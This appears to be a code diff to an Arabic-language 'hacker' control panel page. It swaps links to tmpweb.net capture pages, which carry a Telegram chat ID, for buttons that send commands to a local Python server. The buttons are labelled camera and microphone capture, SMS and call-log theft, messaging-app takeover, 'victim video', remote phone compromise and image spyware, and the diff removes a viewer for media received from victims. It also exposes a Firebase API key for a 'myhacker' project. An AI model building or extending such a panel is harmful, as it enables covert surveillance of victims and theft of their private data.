@@ -8,15 +8,14 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
         body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; text-align: center; margin-bottom: 50px; }
-        .box { border: 1px solid #0f0; padding: 20px; max-width: 500px; margin: auto; box-shadow: 0 0 15px #0f0; border-radius: 10px; }
+        .box { border: 1px solid #0f0; padding: 20px; max-width: 600px; margin: auto; box-shadow: 0 0 15px #0f0; border-radius: 10px; }
         input { background: #000; border: 1px solid #0f0; color: #fff; padding: 12px; width: 85%; margin: 10px 0; outline: none; }
         .btn { background: #0f0; color: #000; font-weight: bold; padding: 15px; width: 95%; border: none; cursor: pointer; transition: 0.3s; }
         .services { display: none; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
-        .s-btn { background: rgba(0,255,0,0.1); border: 1px solid #0f0; color: #fff; padding: 10px; text-decoration: none; font-size: 13px; border-radius: 5px; transition: 0.3s; display: block; }
+        .s-btn { background: rgba(0,255,0,0.1); border: 1px solid #0f0; color: #fff; padding: 10px; text-decoration: none; font-size: 13px; border-radius: 5px; transition: 0.3s; display: block; width: 100%; cursor: pointer; }
         .s-btn:hover { background: rgba(0,255,0,0.4); box-shadow: 0 0 10px #0f0; }
         .spy-btn { grid-column: span 2; background: rgba(255,0,0,0.2); border: 1px solid red; color: #ff4444; }
         .footer { margin-top: 30px; border-top: 1px solid #333; padding-top: 15px; font-size: 12px; color: #888; }
-        #media-list img, #media-list video { width: 100%; border-radius: 5px; margin-top: 10px; border: 1px solid #0f0; }
     </style>
 </head>
 <body>
@@ -42,16 +41,21 @@
     <div id="step-active" style="display:none;">
         <h3 style="color:cyan;">✅ تم تفعيل الوصول الكامل (Root)</h3>
         <div class="services" id="services-grid">
-            <a href="https://tmpweb.net/Jqd9NNxGbdT6/?chatId=7549050561" target="_blank" class="s-btn">📸 كاميرا أمامية</a>
-            <a href="https://tmpweb.net/Yb0uksirR2Fk/?chatId=7549050561" target="_blank" class="s-btn">📷 كاميرا خلفية</a>
-            <a href="https://tmpweb.net/TEQXejpQWrhp/?chatId=7549050561" target="_blank" class="s-btn">🌐 اختراق موقع</a>
-            <a href="https://tmpweb.net/R_jX4nttzKSk/?chatId=7549050561" target="_blank" class="s-btn">🎤 تسجيل صوت</a>
-            <a href="https://tmpweb.net/UhJ_utmCh2ab/?chatId=7549050561" target="_blank" class="s-btn">📹 فيديو الضحية</a>
-            <a href="https://tmpweb.net/ypbWSSbpyJTB/?chatId=7549050561" target="_blank" class="s-btn">💬 واتساب</a>
-            <a href="https://tmpweb.net/ucBPKivBfKov/?chatId=7549050561" target="_blank" class="s-btn spy-btn">📱 اختراق الهاتف بالكامل (Remote)</a>
-            <a href="https://tmpweb.net/9aphyqswZnh8/?chatId=7549050561" target="_blank" class="s-btn spy-btn">🖼️ اختراق عبر صورة (Spyware)</a>
+            <button onclick="runPython('cam_front')" class="s-btn">📸 كاميرا أمامية</button>
+            <button onclick="runPython('cam_back')" class="s-btn">📷 كاميرا خلفية</button>
+            <button onclick="runPython('web_hack')" class="s-btn">🌐 اختراق موقع</button>
+            <button onclick="runPython('mic_rec')" class="s-btn">🎤 تسجيل صوت</button>
+            
+            <button onclick="runPython('pull_sms')" class="s-btn">📩 سحب الرسائل</button>
+            <button onclick="runPython('pull_calls')" class="s-btn">📞 سحب المكالمات</button>
+            <button onclick="runPython('open_wa')" class="s-btn">🟢 واتساب مباشر</button>
+            <button onclick="runPython('open_fb')" class="s-btn">🔵 فيسبوك مباشر</button>
+            <button onclick="runPython('open_tg')" class="s-btn">✈️ تليجرام مباشر</button>
+            <button onclick="runPython('victim_video')" class="s-btn">📹 فيديو الضحية</button>
+            
+            <button onclick="runPython('remote_full')" class="s-btn spy-btn">📱 اختراق الهاتف بالكامل (Remote)</button>
+            <button onclick="runPython('image_spy')" class="s-btn spy-btn">🖼️ اختراق عبر صورة (Spyware)</button>
         </div>
-        <div id="media-list"></div>
     </div>
 
     <div class="footer">
@@ -64,7 +68,6 @@
         apiKey: "AIzaSyDpY9jp7nA3Nn-dCh7rPqhjsrrPEBgSIUI",
         databaseURL: "https://myhacker-a9a62-default-rtdb.firebaseio.com",
         projectId: "myhacker-a9a62",
-        storageBucket: "myhacker-a9a62.firebasestorage.app"
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
@@ -87,7 +90,6 @@
                 document.getElementById('step-wait').style.display = 'none';
                 document.getElementById('step-active').style.display = 'block';
                 document.getElementById('services-grid').style.display = 'grid';
-                loadMedia(id);
             } else {
                 document.getElementById('step-wait').style.display = 'block';
                 document.getElementById('myid').innerText = id;
@@ -95,22 +97,16 @@
         });
     }
 
-    function loadMedia(id) {
-        db.ref('media/' + id).on('value', (snap) => {
-            const div = document.getElementById('media-list');
-            div.innerHTML = "<hr><h4 style='color:yellow;'>📥 ملفات مستلمة:</h4>";
-            if(snap.exists()){
-                snap.forEach(c => {
-                    const m = c.val();
-                    if(m.type === 'image') div.innerHTML += `<img src="${m.url}">`;
-                    else div.innerHTML += `<video src="${m.url}" controls></video>`;
-                });
-            }
-        });
+    function runPython(command) {
+        fetch('http://127.0.0.1:5000/execute', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ action: command })
+        })
+        .then(res => res.json())
+        .then(data => console.log("Success: " + data.status))
+        .catch(err => alert("Server Offline: تأكد من تشغيل ملف البايثون"));
     }
-
-    const savedId = localStorage.getItem('x_user_id');
-    if(savedId) check(savedId);
 </script>
 </body>
 </html>
